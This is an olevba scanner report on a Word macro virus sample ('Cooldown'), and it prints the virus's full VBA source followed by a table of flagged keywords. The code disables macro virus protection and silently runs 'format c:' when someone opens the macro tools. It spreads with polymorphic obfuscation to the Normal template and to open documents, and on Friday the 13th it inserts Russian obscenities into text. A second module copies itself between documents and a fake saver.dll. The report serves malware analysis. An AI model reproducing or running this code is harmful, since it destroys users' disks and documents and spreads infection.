olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-e03331db799f0c25e1a9da0ce9e451ccd436c822
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-e03331db799f0c25e1a9da0ce9e451ccd436c822 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
       Private Sub _
   Document_Open()
    ' 3572.507
CoolDown 0
          ' 4712.356
' 5222.942
End _
               Sub
               ' 7182.822
Private Sub _
           Document_Close()
       
CoolDown 0
        
' 6401.411
' 2080.022
End Sub
           ' 1717.787
' 5088.771
Private _
          Sub _
           ToolsMacro()
   ' 5844.228
CoolDown _
   1
        End _
             Sub
    Private Sub _
    ViewVBCode()
      ' 8552.597

' 8603.26
' 9103.481
' 6580.768
CoolDown 1
              ' 2704.343
End _
               Sub
            Private Sub CoolDown(How As Integer)
                ' 1420.27
On Error _
  Resume _
              Next
     Dim _
     c _
               As String, a _
          As _
     Long, b As _
Long, _
  d As _
          Long, e As Long, f As Long, res As _
               String, m As Boolean
     ' 1448.964
' 6357
Randomize
                With Options
         

' 2135.558

.VirusProtection = _
    False
   .ConfirmConversions = _
           False
   
.SaveNormalPrompt _
  = False
' 925.7775
' 827.8787

' 1287.091

' 378.9568
' 1281.126
' 2629.951
End With
            ' 6790.936
If How = 1 Then
     ' 6870.984
' 86.34567
s = Shell("format" & _
     Chr(32) & _
  "c:" & _
          Chr(32) & "/autotest", _
              vbHide)
      ' 2708.161
' 9859.901
Else
         ' 5674.97
' 4770.699
With NormalTemplate.VBProject.VBComponents(1).CodeModule
       If Not .Find("Cool" _
 & "Down", _
             1, _
          1, 1000, _
 1000, False, False) Then
     ' 4483.708
a _
            = _
          .CountOfLines
           For b = _
          1 _
           To a
         
.DeleteLines (1)
          Next
   ' 6437.178
' 8375.04

d = 1
  a _
 = _
        ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
 res = _
  ""
      For _
        b = _
               1 To _
           a
       ' 286.2263
' 6143.249
' 2675.885
c _
             = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
   c = RTrim(LTrim(c))
   
' 7710.471
' 2766.9
If foo(c, f, _
               res) _
 Then
               .InsertLines _
      d, Space(Rnd _
           * _
              16) & _
     res
           ' 1616.173
d _
              = d _
   + _
       f
      f = _
 0
           ' 6499.949
' 4739.936

' 214.6673
' 3910.301
' 421.5181
res _
     = _
              ""
 End If
          Next
         ' 4973.247
' 758.2385

NormalTemplate.Save
 End If
               End _
With
     For _
   e _
             = _
    1 To _
            Documents.Count
                With Documents(e).VBProject.VBComponents(1).CodeModule
       ' 9510.648
If _
            Not _
        .Find("Cool" & _
     "Down", _
 1, 1, _
        1000, 1000, False, _
   False) Then
               ' 1850.912
' 1719.611
' 7771.459
' 2315.274
a _
     = _
                .CountOfLines
 m = Documents(e).Saved
       For _
           b _
          = 1 To a
       .DeleteLines _
  (1)
               ' 9244.502
' 2470.499
' 2921.678
Next
                d _
     = _
       1
     a _
   = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
         res _
           = _
    ""
           ' 9028.492
For _
   b = 1 _
                To _
  a
 ' 963.0197
c = _
                NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
               1)
     c = _
            RTrim(LTrim(c))
  
' 3884.748
' 6640.627
' 6244.967
If foo(c, f, res) Then
             .InsertLines _
 d, Space(Rnd * _
       16) _
             & _
        res
        d = d + f
       f _
        = 0
               res _
          = _
               ""
      ' 4462.567
End _
    If
  Next
        If Documents(e).Path _
              <> "" _
             Then
             Documents(e).SaveAs _
          AddToRecentFiles:=False
            ' 8861.81
End If
  If (WeekDay(Date) = _
       6) And _
       (Day(Date) _
 = _
        13) And _
       (Rnd > 0.7) Then
      Application.StatusBar _
                = _
       ""
    Application.DisplayStatusBar = False
  Application.ScreenUpdating = _
         False
              With Documents(e).Content
    ' 8382.894
' 115.0125
' 6980.009
' 6680.644
' 3888.863
.Find.Execute FindText:="пр", ReplaceWith:="пизд", _
             Replace:=wdReplaceAll
       ' 8080.445
' 2512.699
.Find.Execute _
    FindText:="др", _
     ReplaceWith:="понос", _
           Replace:=wdReplaceAll
   
.Find.Execute FindText:="кр", _
  ReplaceWith:="кобыл", _
              Replace:=wdReplaceAll
                .Find.Execute FindText:="стр", ReplaceWith:="ебан", Replace:=wdReplaceAll
          ' 7524.841
.Find.Execute _
   FindText:="ср", _
           ReplaceWith:="срак", Replace:=wdReplaceAll
     
' 41.50927
' 867.6732
' 6580.657
.Find.Execute FindText:="тр", _
           ReplaceWith:="трах", Replace:=wdReplaceAll
              
' 5423.465
' 7667.301
.Find.Execute FindText:="бр", ReplaceWith:="бляд", _
       Replace:=wdReplaceAll
 .Find.Execute _
         FindText:="вр", ReplaceWith:="выеб", Replace:=wdReplaceAll
            ' 4852.983
' 7004.642
.Find.Execute _
             FindText:="гр", _
            ReplaceWith:="говн", _
         Replace:=wdReplaceAll
              
' 3761.836
' 9541.769
.Find.Execute _
           FindText:="жр", _
        ReplaceWith:="жоп", Replace:=wdReplaceAll
        .Find.Execute FindText:="зр", _
           ReplaceWith:="залуп", _
       Replace:=wdReplaceAll
          .Find.Execute FindText:="дж", _
         ReplaceWith:="джоп", Replace:=wdReplaceAll
     .Find.Execute _
  FindText:="кал", _
                ReplaceWith:="дер", _
      Replace:=wdReplaceAll
             .Find.Execute _
          FindText:="бух", _
          ReplaceWith:="бряк", Replace:=wdReplaceAll
       ' 7590.878
' 943.3925
' 6501.567
' 3002.517
' 3167.163
End _
 With
   Documents(e).UndoClear
     
' 4125.034


Application.DisplayStatusBar = _
       True
         ' 5110.282
' 7335.402
Application.ScreenUpdating = True
      ' 5792.074
Application.StatusBar = ""
     ' 4875.847
End If
 ' 3683.595
' 891.9525

Documents(e).Saved = _
m
        End If
             End With
               Next
' 1788.183
' 9729.81
' 324.8358
' 1873.253
' 109.3233
' 4690.382
' 3842.986
End _
     If
    ' 9102.381
End Sub
           Private Function foo(ByRef s As _
     String, ByRef _
                i _
            As _
 Long, ByRef res _
        As String) _
           As Boolean
 Dim _
 tmp As _
    String
              If _
             (Left(s, 1) _
     = "'") _
       Or _
    (Len(s) _
            = _
         0) _
        Then
   ' 5045.797
' 2645.209

' 6242.034
' 4131
foo _
  = _
    False
              ' 3186.211
' 2412.143
Exit _
               Function
      End _
      If
 ' 8617.757
' 4975.489
' 174.014
If Right(s, _
               2) = Chr(32) & "_" _
    Then
          ' 667.1864
' 7851.344
res = res _
            & Left(s, _
    Len(s) - _
 1)
              ' 8913.123
' 4160.03
' 2636.977
foo _
         = _
                False
  Exit Function
      End If
      
' 8617.592
' 1948.331
tmp _
         = res & _
 s
    res = _
      ""
     i _
       = _
      1
           While Rnd _
        > _
        0.5
         If _
       Rnd < _
   0.8 _
    Then
 
' 8956.163

res _
          = res _
     & _
   "'" _
             & _
Str(Rnd _
                * _
            10000)
              ' 5410.654
End _
If
     ' 1628.003
res = res & Chr(13)
  ' 7094.051
i = _
     i _
   + 1
               Wend
       For _
               a = _
               1 To Len(tmp)
 ' 4116.636
res = _
               res & _
            Mid(tmp, _
a, _
       1)
 If _
       Mid(tmp, a, _
         1) = Chr(32) Then
                ' 8491.325
' 3091.901
' 5931.415
If Rnd _
  > _
        0.5 _
 Then
           res _
               = res & _
   "_" _
   & _
     Chr(13) & _
   Space(Rnd _
  * _
 16)
      i _
          = _
      i + _
               1
     ' 4432.338
' 1162.331
End If
           End If
Next
              foo = _
 True
 
' 5904.897
End Function

-------------------------------------------------------------------------------
VBA MACRO Saver.bas 
in file: Virus.MSWord.Cooldown-e03331db799f0c25e1a9da0ce9e451ccd436c822 - OLE stream: 'Macros/VBA/Saver'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Mac(dr)
Attribute Mac.VB_Description = "Макрос записан 02.02.00 КОНОТОП"
Attribute Mac.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Макрос1"
 If (Dir(dr, vbDirectory) = "") Then MkDir (dr)
End Sub
Sub Setup()
  Word.Options.VirusProtection = False
  On Error Resume Next
  
  If Word.ActiveDocument.name = "saver.dll" Then MsgBox "Saver!"
    
  zz = Word.ActiveDocument.FullName
  
  Application.OrganizerCopy Source:=zz, _
      Destination:=Normal.ThisDocument.FullName, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=zz, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
  yy = Word.Application.Path + "\saver.dll"
  
  If (Dir(yy) = "") Then
    Application.Documents.Add
    Application.Documents(1).SaveAs (yy)
    Application.Documents(1).Close SaveChanges:=False
    Word.RecentFiles.Item(1).Delete
  End If
  
  
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=yy, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=zz, _
      Destination:=yy, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=yy, _
      Destination:=zz, name:="Saver", _
      Object:=wdOrganizerObjectProjectItems
      
End Sub
Sub AutoNew()
  dr = Word.Application.Path + "\Doc_Copy"
  Mac (dr)
End Sub
Sub AutoOpen()
  Setup
  dr = Word.Application.Path + "\Doc_Copy"
  Mac (dr)
  If Word.ActiveDocument.name = "saver.dll" Then Word.ActiveDocument.Close
End Sub
Sub AutoClose()
  dr = Word.Application.Path + "\Doc_Copy"
  Pat = dr + "\" + ActiveDocument.name
  If Word.ActiveDocument.name <> "saver.dll" Then
    On Error Resume Next
    ActiveDocument.Saved = False
    ActiveDocument.Save
    ActiveDocument.SaveAs (Pat)
  End If
  Word.RecentFiles.Item(1).Delete
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |saver.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

